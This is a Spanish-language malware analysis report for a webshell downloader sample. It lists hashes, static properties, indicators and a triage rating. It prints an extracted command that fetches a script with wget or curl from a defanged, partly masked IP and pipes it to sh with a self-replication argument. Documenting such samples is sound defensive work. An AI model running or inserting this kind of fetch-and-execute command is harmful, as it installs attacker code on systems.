# 🧬 Payload Analysis

`029bbd4aceec0ad70fe08d086d0237e7cf2cef9e5efcf43368d46b7390763535`

## 📌 Resumen

Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se identificó 1 comando observado o extraído. Se identificaron 6 indicadores técnicos. **Ficha malware:** [malware-like/oraculo/downloader/029bbd4aceec0ad70fe08d086d0237e7cf2cef9e5efcf43368d46b7390763535.md](../../../../../malware-like/oraculo/downloader/029bbd4aceec0ad70fe08d086d0237e7cf2cef9e5efcf43368d46b7390763535.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Familia:** `webshell`
- **Confianza de familia:** `Media`
- **Riesgo:** `High`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:07:07.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `029bbd4aceec0ad70fe08d086d0237e7cf2cef9e5efcf43368d46b7390763535`
- **SHA1:** `80f2c48599325b49fe016a3104a0e7b4386ee761`
- **MD5:** `630da3a341c6b6b98e62c8ba2d67fab1`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (320), with CRLF line terminators |
| Tamaño | 4.0 KiB |
| Entropía | 5.61 |
| Strings | 102 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (320), with CRLF line terminators; strings=102; iocs=6

## 🖥️ Comandos observados / extraídos

```text
(wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh || curl -sk hxxps://14.46.136.XXX/sh) | sh -s apache.selfrepPOS
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://14.46.136.XXX/sh | strings |
| url | hxxps://14.46.136.XXX/sh) | strings |
| ip | 14.46.136.XXX | static_analysis |
| ip | 190.179.160.XXX | static_analysis |
| command | (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh \|\| curl -sk hxxps://14.46.136.XXX/sh) \| sh -s apache.selfrepPOS | strings |
| hash | 029bbd4aceec0ad70fe08d086d0237e7cf2cef9e5efcf43368d46b7390763535 | static_analysis |
| ip | 167.172.86.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
